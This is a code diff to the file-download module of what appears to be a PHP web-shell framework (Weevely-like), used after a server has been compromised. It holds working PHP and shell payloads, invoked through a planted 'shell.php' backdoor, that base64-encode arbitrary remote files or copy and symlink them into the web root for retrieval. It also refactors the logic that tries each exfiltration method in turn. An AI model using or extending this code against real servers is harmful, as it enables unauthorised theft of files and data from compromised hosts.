@@ -22,9 +22,10 @@ class Download(Module):
         V('shell.php', 'file', "print(@base64_encode(implode('', file('%s'))));"),
         V('shell.php', 'fread', "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
         V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('%s')));"),
-        V('shell.php', "copy", "@copy('compress.zlib://%s','%s') && print(1);"),
-        V('shell.php',  "symlink", "@symlink('%s','%s') && print(1);"),
-        V('shell.sh',  "base64", "base64 -w 0 %s")
+        V('shell.sh',  "base64", "base64 -w 0 %s"),
+        V('shell.php', "copy", "copy('compress.zlib://%s','%s') && print(1);"),
+        V('shell.php',  "symlink", "symlink('%s','%s') && print(1);")
+
     ])
 
 
@@ -35,22 +36,6 @@ class Download(Module):
                     P(arg='lpath', help='Local file path', required=True, pos=1)
                     )
 
-#    vectors_order = { 'shell.php' : [  "file", "fread", "file_get_contents", "copy", "symlink"], 
-#                      'shell.sh'  : [ "base64" ]
-#                     }
-#    
-#    vectors = { 'shell.php' : { 
-#                               "file"             : "print(@base64_encode(implode('', file('%s'))));",
-#                               "fread"            : "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
-#                                "file_get_contents"     : "print(@base64_encode(file_get_contents('%s')));",
-#                                "copy"       : "@copy('compress.zlib://%s','%s') && print(1);",
-#                                "symlink"     : "@symlink('%s','%s') && print(1);"
-#                                },
-#                'shell.sh' : {
-#                                "base64" : "base64 -w 0 %s"
-#                                }
-#               }
-    
     
     def __init__(self, modhandler, url, password):
         
@@ -75,119 +60,57 @@ class Download(Module):
         else:
             self.mprint('[%s] PHP \'base64_encode\' transfer methods not available.' % self.name)
 
-    def __slack_probe(self, remote_path, local_path):
 
-        vectors = self._get_default_vector2()
-        if not vectors:
-            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
-        
-        for vector in vectors:
-            
-            response = self.__execute_payload(vector, [remote_path, local_path])
-            if response != None:
-                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
-                return response
-        
-        raise ModuleException(self.name,  "File download failed")     
-            
-#    def __slack_probe(self, remote_path, local_path):
-#                
-#        interpreter, vector = self._get_default_vector()
-#        if interpreter and vector:
-#            return self.__execute_payload(interpreter, vector, remote_path, local_path)
-#                
-#        for interpreter in self.vectors:
-#            if interpreter in self.modhandler.loaded_shells:
-#                for vector in self.vectors_order[interpreter]:
-#                    response = self.__execute_payload(interpreter, vector, remote_path, local_path)
-#                    if response:
-#                        return response
-#                    
-#                    
-#                    
-#        raise ModuleException(self.name,  "File download failed")     
-#    
-                    
-#    def __execute_payload(self, interpreter, vector, remote_path, local_path):
+    def __prepare_payload( self, vector, parameters ):
+
+        if vector.payloads[0].count( '%s' ) == len(parameters):
+            return vector.payloads[0] % tuple(parameters)
+        else:
+            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
+
         
     def __execute_payload(self, vector, parameters):
         
+        remote_path = parameters[0]
         
-        if vector.payloads[0].count( '%s' ) == len(parameters):
-            payload = vector.payloads[0] % tuple(parameters)
-            
-            if (vector.name == 'copy' or vector.name == 'symlink'):
-        
-                if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
-                    
-                    try:
-                        self.modhandler.load('find.webdir').run_module('auto')
-                    except ModuleException, e:
-                        self.mprint('[!] [' + e.module + '] ' + e.error)
-                        return
-                    
-                    self.transfer_url_dir = self.modhandler.load('find.webdir').url
-                    self.transfer_dir = self.modhandler.load('find.webdir').dir
-                
-                    filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
-                    self.file_path = self.transfer_dir + filename
-                    self.url = self.transfer_url_dir + filename
-                
-                payload = payload % (remote_path, self.file_path)
-                
-                
-            response = self.modhandler.load(vector.interpreter).run_module(payload)
-            
-            if response:
-                
-                self.payload = payload
-                self.interpreter = vector.interpreter
-                self.vector = vector
-                
-                return response
-                  
+        if (vector.name == 'copy' or vector.name == 'symlink'):
     
-#        
-#                    payload = self.vectors[interpreter][vector]
-#                    
-#                    if payload.count( '%s' ) == 1:
-#                        payload = payload % remote_path
-#                        
-#                    if (vector == 'copy' or vector == 'symlink') and payload.count( '%s' ) == 2:
-#                        
-#                        if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
-#                            
-#                            try:
-#                                self.modhandler.load('find.webdir').run('auto')
-#                            except ModuleException, e:
-#                                self.mprint('[!] [' + e.module + '] ' + e.error)
-#                                return
-#                            
-#                            self.transfer_url_dir = self.modhandler.load('find.webdir').url
-#                            self.transfer_dir = self.modhandler.load('find.webdir').dir
-#                        
-#                            filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
-#                            self.file_path = self.transfer_dir + filename
-#                            self.url = self.transfer_url_dir + filename
-#                        
-#                        payload = payload % (remote_path, self.file_path)
-#                        
-#                        
-#                    response = self.modhandler.load(interpreter).run(payload)
-#                    
-#                    if response:
-#                        
-#                        self.payload = payload
-#                        self.interpreter = interpreter
-#                        self.vector = vector
-#                        
-#                        return response
-#  
+            if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
+                
+                try:
+                    self.modhandler.load('find.webdir').run_module('auto')
+                except ModuleException, e:
+                    self.mprint('[!] [' + e.module + '] ' + e.error)
+                    return
+                
+                self.transfer_url_dir = self.modhandler.load('find.webdir').url
+                self.transfer_dir = self.modhandler.load('find.webdir').dir
+            
+                filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
+                self.file_path = self.transfer_dir + filename
+                self.url = self.transfer_url_dir + filename
+            
+            payload = self.__prepare_payload(vector, [remote_path, self.file_path])
+        else:
+            
+            payload = self.__prepare_payload(vector, [remote_path])
+            
+            
+        response = self.modhandler.load(vector.interpreter).run_module(payload)
+        
+        if response:
+            
+            self.payload = payload
+            self.interpreter = vector.interpreter
+            self.vector = vector
+            
+            return response
+   
      
      
     def __process_response(self,response, remote_path, local_path):
         
-        if self.vector == 'copy' or self.vector == 'symlink':
+        if self.vector.name == 'copy' or self.vector.name == 'symlink':
             
             
             if self.modhandler.load('file.check').run_module(self.file_path, 'exists'):
@@ -209,7 +132,7 @@ class Download(Module):
                 try:
                     response = b64decode(response)
                 except TypeError:
-                    self.mprint("[!] [%s] Error, unexpected file content")
+                    self.mprint("[!] [%s] Error, unexpected file content" % (self.name))
                     
                     
         if response:
@@ -232,23 +155,27 @@ class Download(Module):
             elif not  remote_md5 == response_md5:
                 self.mprint('[%s] MD5 hash of \'%s\' file mismatch, file corrupted' % (self.name, local_path))
             else:
-                self.mprint('[%s] File correctly downloaded to \'%s\' using method \'%s\'' % (self.name, local_path, self.vector))
+                self.mprint('[%s] File correctly downloaded to \'%s\' using method \'%s\'' % (self.name, local_path, self.vector.name))
                 return response
 
      
     def run_module(self, remote_path, local_path, returnFileData = False):
+    
+        vectors = self._get_default_vector2()
+        if not vectors:
+            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
         
-        
-        self.__slack_probe(remote_path, local_path)
-        response = self.modhandler.load(self.interpreter).run_module(self.payload)
-        
-        if response:
-            file_response = self.__process_response(response,remote_path, local_path)
-            if returnFileData:
-                return file_response
-            else:
-                return
+        for vector in vectors:
             
+            response = self.__execute_payload(vector, [remote_path, local_path])
+            if response != None:
+                    
+                file_response = self.__process_response(response, remote_path, local_path)
+                if returnFileData:
+                    return file_response
+                else:
+                    return
+                    
         raise ModuleException(self.name,  "File read failed")
         
         
